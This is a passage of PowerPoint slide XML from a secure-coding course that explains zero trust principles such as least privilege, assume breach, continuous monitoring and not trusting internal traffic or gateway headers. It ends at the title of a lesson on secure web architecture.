            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24744435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F2FA-CBF3-9386-02D2-31D4986AA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906A6-90B6-5557-0FD9-5EAC4BCF721C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Principles – 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0180AD4B-F7F7-B3CF-F4A5-1837C869F5E9}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least privilege, everywhere</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Users and services should have only the access they absolutely need, and preferably </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>just-in-time</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (temporary elevation).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Long-lived broad roles (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> everywhere) are anti–zero trust.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21508259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CABDD-0763-4BA8-04B2-5F556FEE8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AE2D9-9321-732C-80D9-B234C07347E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Principles – 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B439F3E7-55CC-13AB-E455-D9EC4B876432}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Assume breach</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Design as if an attacker is already inside:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>One microservice compromised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>One laptop stolen.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>One API key leaked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Focus on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>limiting blast radius</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>lateral movement.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22079428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A72D1-5995-2B05-BB06-B0E01DC9B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8274E-ED20-F7B4-4FC5-52F8AAAAE67D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Principles – 05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D80B6E94-C847-E4C5-9153-FC8245A03361}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Continuous monitoring and adaptive policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t treat auth as a one-and-done gate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Keep collecting signals (behavior, device health, anomalies) and adapt:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Step-up auth (MFA) if risk rises.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Kill sessions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lock down segments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34150957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C274-439A-DCC7-44DC-FC23FCE39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EC3AC-BB85-4480-812C-7E452FFE5248}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> E-W Traffic in Code Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3B59548-ECC8-4B97-3610-8881970AF950}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>When you write code, you’re always (often implicitly) answering questions like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Can I trust this header?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Do I need to re-check auth here, or did something in front already do it?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Is this endpoint exposed to the internet, or only to internal services?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42227390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B316-F87C-CA60-FF5F-7E125047E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B1D67-71EF-A8AD-0650-5394FCA0861D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA in Code Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22311B17-5ACD-C970-2DF4-09EF06478D27}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Secure coding already says:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Validate all external input.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t trust client-side checks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust adds:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t trust something </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>just because it’s “internal”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t trust a request </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>just because it came through the VPN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Don’t trust a header </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>just because your API gateway usually sets it</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7382213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EA87-E687-6724-CA31-514B73957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62C20-6087-B1C7-EFAD-B2A6CE494601}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>POLP in Code Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B5C82AA-2B31-ED8A-6BAC-F7371C64372A}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust pushes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>least privilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> everywhere:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Every microservice should only:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Call the few services it truly needs,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Access only the minimal data fields it requires.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="340904464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1A44B-B5F5-6A47-DD2A-D73E7A61A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60807-2B7D-95F2-6AB6-CFE4D0C93DB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>In Summary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BC6E0062-11C6-DE4F-355A-4129B11C1F81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7958082" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Secure coding isn’t just:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Don’t do SQL injection and XSS.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>It’s also:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Design and implement code that behaves safely in a modern, zero-trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> microservice-heavy environment.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10977505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AE63-FC5F-701E-C893-3A0D333A0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50425-97FB-2DF7-7F6A-FE7E27DDAF4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1313597"/>
            <a:ext cx="10515600" cy="4237977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 02 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Secure Web Architecture Refresher </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="Cambria"/>
